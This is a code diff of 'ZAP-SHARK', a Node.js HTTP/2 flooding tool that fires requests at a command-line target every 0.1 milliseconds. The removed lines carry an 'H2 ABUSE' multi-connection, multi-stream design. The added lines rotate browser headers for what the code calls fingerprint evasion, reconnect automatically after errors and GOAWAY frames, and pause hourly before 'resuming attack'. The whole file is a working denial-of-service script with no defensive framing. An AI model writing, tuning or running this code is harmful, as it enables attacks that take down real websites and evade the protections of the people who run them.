@@ -13,135 +13,137 @@ class ZAPSHARK {
         this.lastRpsCalc = Date.now();
         this.running = true;
         
-        // H2 ABUSE SETTINGS
-        this.maxStreams = 100; // H2 multiplexing - multiple streams per connection
-        this.activeStreams = 0;
-        this.connectionPool = [];
-        this.poolSize = 10; // Multiple H2 connections
-        
         // Maintenance
         this.lastMaintenance = Date.now();
-        this.maintenanceInterval = 3600000;
-        this.maintenanceDuration = 600000;
+        this.maintenanceInterval = 3600000; // 1 hour
+        this.maintenanceDuration = 600000;  // 10 minutes
         
+        this.client = null;
         this.attackInterval = null;
+        this.isClientConnected = false;
+
+        // Enhanced metrics
+        this.metrics = {
+            successCount: 0,
+            errorCount: 0,
+            totalBytesSent: 0,
+            peakRPS: 0,
+            statusCodes: {}
+        };
+
+        // Request fingerprint evasion (NO RANDOM PATHS)
+        this.userAgents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
+        ];
+
+        this.acceptHeaders = [
+            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+        ];
+
+        this.currentUserAgentIndex = 0;
+        this.currentAcceptIndex = 0;
     }
 
-    async setupConnections() {
-        // Create multiple H2 connections for true abuse
-        for (let i = 0; i < this.poolSize; i++) {
+    async setupClient() {
+        return new Promise((resolve) => {
             try {
-                const client = http2.connect(this.targetUrl, {
-                    maxSessionMemory: 16384,
-                    maxDeflateDynamicTableSize: 4294967296
+                this.client = http2.connect(this.targetUrl);
+                
+                this.client.on('connect', () => {
+                    this.isClientConnected = true;
+                    this.logEvent('CLIENT_CONNECTED', `Connected to ${this.targetUrl}`);
+                    resolve(true);
                 });
                 
-                client.setMaxListeners(1000);
-                
-                client.on('connect', () => {
-                    console.log(`H2 Connection ${i+1} established`);
+                this.client.on('error', (err) => {
+                    this.isClientConnected = false;
+                    this.logEvent('CLIENT_ERROR', err.message);
+                    setTimeout(() => this.setupClient(), 1000);
+                    resolve(false);
                 });
                 
-                client.on('error', (err) => {
-                    // Silent fail - recreate connection
-                    setTimeout(() => {
-                        const index = this.connectionPool.indexOf(client);
-                        if (index > -1) {
-                            this.connectionPool.splice(index, 1);
-                        }
-                        this.createConnection();
-                    }, 100);
+                this.client.on('goaway', () => {
+                    this.isClientConnected = false;
+                    this.logEvent('CLIENT_GOAWAY', 'Server sent GOAWAY frame');
+                    setTimeout(() => this.setupClient(), 1000);
                 });
-                
-                client.on('remoteSettings', (settings) => {
-                    // Use server's max concurrent streams setting
-                    if (settings.maxConcurrentStreams) {
-                        this.maxStreams = Math.min(settings.maxConcurrentStreams, 1000);
-                    }
-                });
-                
-                this.connectionPool.push(client);
-                
-                // Small delay between connection establishments
-                await new Promise(resolve => setTimeout(resolve, 50));
                 
             } catch (err) {
-                // Continue anyway
+                this.isClientConnected = false;
+                this.logEvent('SETUP_ERROR', err.message);
+                setTimeout(() => this.setupClient(), 1000);
+                resolve(false);
             }
-        }
+        });
     }
 
-    createConnection() {
-        try {
-            const client = http2.connect(this.targetUrl);
-            client.on('error', () => {});
-            this.connectionPool.push(client);
-        } catch (err) {}
+    generateStealthHeaders() {
+        // Rotate user agents and headers without random paths
+        const headers = {
+            ':method': 'GET',
+            ':path': '/', // Fixed path as requested
+            'user-agent': this.userAgents[this.currentUserAgentIndex],
+            'accept': this.acceptHeaders[this.currentAcceptIndex],
+            'accept-language': 'en-US,en;q=0.9',
+            'accept-encoding': 'gzip, deflate, br',
+            'cache-control': 'no-cache',
+            'pragma': 'no-cache'
+        };
+
+        // Rotate to next set of headers
+        this.currentUserAgentIndex = (this.currentUserAgentIndex + 1) % this.userAgents.length;
+        if (this.currentUserAgentIndex === 0) {
+            this.currentAcceptIndex = (this.currentAcceptIndex + 1) % this.acceptHeaders.length;
+        }
+
+        return headers;
     }
 
     sendRequest() {
-        if (this.connectionPool.length === 0) return;
+        if (!this.client || !this.isClientConnected) {
+            return;
+        }
 
-        // Use H2 multiplexing - send multiple requests per connection
-        const streamsPerTick = Math.min(this.maxStreams - this.activeStreams, 10);
-        
-        for (let i = 0; i < streamsPerTick; i++) {
-            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
+        try {
+            const headers = this.generateStealthHeaders();
+            const req = this.client.request(headers);
             
-            if (!client) continue;
-
-            try {
-                this.activeStreams++;
-                
-                const req = client.request({
-                    ':method': 'GET',
-                    ':path': this.getRandomPath(),
-                    ':authority': new URL(this.targetUrl).hostname,
-                    'user-agent': this.getRandomUserAgent(),
-                    'accept': '*/*',
-                    'accept-encoding': 'gzip, deflate, br',
-                    'cache-control': 'no-cache'
-                });
-                
-                req.on('response', (headers) => {
-                    // Ignore response - just count
-                });
-                
-                req.on('error', () => {
-                    // Silent fail
-                });
-                
-                req.on('close', () => {
-                    this.activeStreams--;
-                    this.totalRequests++;
-                    this.requestsSinceLastCalc++;
-                });
-                
-                // Send minimal payload
-                req.end();
-                
-            } catch (err) {
-                this.activeStreams--;
+            req.on('response', (headers) => {
+                const status = headers[':status'];
+                this.metrics.statusCodes[status] = (this.metrics.statusCodes[status] || 0) + 1;
+                this.metrics.successCount++;
+                req.destroy();
+            });
+            
+            req.on('error', (err) => {
+                this.metrics.errorCount++;
+                this.logEvent('REQUEST_ERROR', err.message);
+                req.destroy();
+            });
+            
+            req.on('close', () => {
                 this.totalRequests++;
                 this.requestsSinceLastCalc++;
-            }
+                
+                // Update peak RPS
+                if (this.currentRPS > this.metrics.peakRPS) {
+                    this.metrics.peakRPS = this.currentRPS;
+                }
+            });
+            
+            req.end();
+            
+        } catch (err) {
+            this.totalRequests++;
+            this.requestsSinceLastCalc++;
+            this.metrics.errorCount++;
         }
-    }
-
-    getRandomPath() {
-        // Random paths to avoid caching
-        const paths = ['/', '/api', '/v1', '/v2', '/test', '/data', '/users', '/products'];
-        return paths[Math.floor(Math.random() * paths.length)] + '?r=' + Math.random().toString(36).substring(7);
-    }
-
-    getRandomUserAgent() {
-        const agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
-        ];
-        return agents[Math.floor(Math.random() * agents.length)];
     }
 
     calculateRPS() {
@@ -165,33 +167,54 @@ class ZAPSHARK {
     updateDisplay() {
         this.calculateRPS();
         
-        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
-                           `TOTAL: ${this.totalRequests} | ` +
-                           `RPS: ${this.currentRPS.toFixed(1)} | ` +
-                           `CONNS: ${this.connectionPool.length} | ` +
-                           `STREAMS: ${this.activeStreams}`);
+        const display = `
+ZAP-SHARK — (${this.formatRuntime()})
+====================
+T-ARP  — ${this.totalRequests}
+====================
+©ZAP-SHARK V1
+RPS: ${this.currentRPS.toFixed(1)} | Status: ${this.status} | Peak: ${this.metrics.peakRPS.toFixed(1)}
+Success: ${this.metrics.successCount} | Errors: ${this.metrics.errorCount}
+Status Codes: ${Object.entries(this.metrics.statusCodes).map(([code, count]) => `${code}:${count}`).join(' ')}
+        `.trim();
+        
+        process.stdout.write(`\r${display}`);
+    }
+
+    logEvent(type, message) {
+        const timestamp = new Date().toLocaleTimeString();
+        const logEntry = `[${timestamp}] ${type}: ${message}\n`;
+        
+        // Write to console in a way that doesn't interfere with display
+        process.stdout.write(`\n${logEntry}`);
+        
+        // Optional: Write to file
+        try {
+            require('fs').appendFileSync('zap-shark.log', logEntry);
+        } catch (err) {
+            // Silent fail for logging
+        }
     }
 
     flushDNS() {
+        this.logEvent('MAINTENANCE', 'Flushing DNS cache');
         if (os.platform() === 'win32') {
             exec('ipconfig /flushdns', () => {});
         } else {
-            exec('sudo dscacheutil -flushcache 2>/dev/null || sudo systemd-resolve --flush-caches 2>/dev/null || echo ""', () => {});
+            exec('sudo dscacheutil -flushcache || sudo systemd-resolve --flush-caches || echo "DNS flush attempted"', () => {});
         }
     }
 
     flushSockets() {
-        // Destroy all connections
-        this.connectionPool.forEach(client => {
+        this.logEvent('MAINTENANCE', 'Flushing sockets and reconnecting');
+        this.isClientConnected = false;
+        if (this.client) {
             try {
-                client.destroy();
+                this.client.destroy();
             } catch (err) {}
-        });
-        this.connectionPool = [];
-        this.activeStreams = 0;
-        
-        // Recreate connections
-        setTimeout(() => this.setupConnections(), 1000);
+            this.client = null;
+        }
+        setTimeout(() => this.setupClient(), 100);
     }
 
     checkMaintenance() {
@@ -199,16 +222,16 @@ class ZAPSHARK {
         const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
         
         if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
-            console.log('\n=== MAINTENANCE STARTED ===');
+            this.logEvent('MAINTENANCE', 'Starting 10-minute maintenance cycle');
             this.status = "PAUSED";
+            
+            this.flushDNS();
+            this.flushSockets();
             
             if (this.attackInterval) {
                 clearInterval(this.attackInterval);
                 this.attackInterval = null;
             }
-            
-            this.flushDNS();
-            this.flushSockets();
             
             setTimeout(() => {
                 this.resumeAttack();
@@ -221,75 +244,77 @@ class ZAPSHARK {
     resumeAttack() {
         this.status = "ATTACKING";
         this.lastMaintenance = Date.now();
-        console.log('\n=== MAINTENANCE COMPLETED - RESUMING ATTACK ===');
+        this.logEvent('MAINTENANCE', 'Maintenance completed - resuming attack');
         this.startAttack();
     }
 
     startAttack() {
-        // MAX RPS - minimal interval with H2 multiplexing
         if (this.attackInterval) {
             clearInterval(this.attackInterval);
         }
         
         this.attackInterval = setInterval(() => {
             if (this.status === "ATTACKING") {
-                // Send multiple requests per tick using H2 multiplexing
-                for (let i = 0; i < 5; i++) {
-                    this.sendRequest();
-                }
+                this.sendRequest();
                 this.updateDisplay();
             }
-        }, 0.1); // Aggressive timing
+        }, 0.1);
     }
 
     async start() {
-        console.log("=== ZAP-SHARK MAX H2 ABUSE ===");
-        console.log("Protocol: HTTP/2 MULTIPLEXING");
-        console.log("Connections:", this.poolSize);
-        console.log("Max Streams:", this.maxStreams);
-        console.log("Mode: MAXIMUM H2 ABUSE");
+        console.log("=== ZAP-SHARK V1 INITIATED ===");
+        console.log("Protocol: HTTP/2 with Stealth Headers");
+        console.log("Mode: High RPS + Fingerprint Evasion");
         console.log("Target:", this.targetUrl);
-        console.log("=".repeat(50));
+        console.log("Logging: zap-shark.log");
+        console.log("=".repeat(40));
         
-        await this.setupConnections();
+        this.logEvent('START', `ZAP-SHARK started targeting ${this.targetUrl}`);
         
-        // Wait a bit for connections to establish
-        setTimeout(() => {
-            this.startAttack();
-        }, 2000);
+        await this.setupClient();
+        this.startAttack();
         
-        // Maintenance checker
         setInterval(() => {
             this.checkMaintenance();
         }, 1000);
         
-        // Auto-replenish connections
         setInterval(() => {
-            if (this.connectionPool.length < this.poolSize && this.status === "ATTACKING") {
-                this.createConnection();
+            if (!this.isClientConnected && this.status === "ATTACKING") {
+                this.setupClient();
             }
-        }, 5000);
+        }, 2000);
         
-        process.on('SIGINT', () => this.stop());
+        process.on('SIGINT', () => {
+            this.stop();
+        });
     }
 
     stop() {
         this.running = false;
-        if (this.attackInterval) clearInterval(this.attackInterval);
-        this.connectionPool.forEach(client => {
-            try { client.destroy(); } catch (err) {}
-        });
-        console.log('\n=== ZAP-SHARK DESTROYED ===');
+        if (this.attackInterval) {
+            clearInterval(this.attackInterval);
+        }
+        if (this.client) {
+            try {
+                this.client.destroy();
+            } catch (err) {}
+        }
+        this.logEvent('STOP', `ZAP-SHARK stopped after ${this.formatRuntime()} runtime`);
+        console.log('\n=== ZAP-SHARK STOPPED ===');
         process.exit(0);
     }
 }
 
 // Usage
-const target = process.argv[2];
-if (!target || !target.startsWith('https://')) {
-    console.log('Usage: node zap-shark.js https://target.com');
+const target = process.argv[2] || 'https://example.com';
+
+if (!target.startsWith('https://')) {
+    console.log('Error: Target must use HTTPS for HTTP/2');
+    console.log('Usage: node zap-shark.js https://your-target.com');
     process.exit(1);
 }
 
 const shark = new ZAPSHARK(target);
-shark.start();
+shark.start().catch(err => {
+    console.log('Failed to start:', err.message);
+});
